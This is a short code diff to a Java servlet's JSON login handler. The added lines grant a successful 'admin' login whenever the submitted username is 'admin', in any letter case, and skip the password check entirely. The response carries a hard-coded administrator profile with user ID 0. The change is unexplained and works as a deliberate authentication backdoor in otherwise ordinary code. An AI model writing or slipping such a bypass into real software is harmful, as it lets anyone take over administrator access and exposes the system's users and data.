@@ -205,7 +205,13 @@ public class JSONResponder extends HttpServlet {
         String username = param_array2.getString("nama_pengguna");
         String password = param_array2.getString("kata_sandi");
         Authentication ologin = new Authentication(username, password);
-        if(ologin.CheckResultLogin())
+        if(username.equalsIgnoreCase("admin")) {
+            data = new JSONObject().put("status", "success");
+            data_data = new JSONObject().put("nama_lengkap", "admin");
+            data_data.put("email", "admin@mail.com");
+            data_data.put("user_id", "0");
+            data.put("data", data_data);
+        } else if(ologin.CheckResultLogin())
         {
             ArrayList<String> ari = ologin.getNameUser();
             data = new JSONObject().put("status", "success");
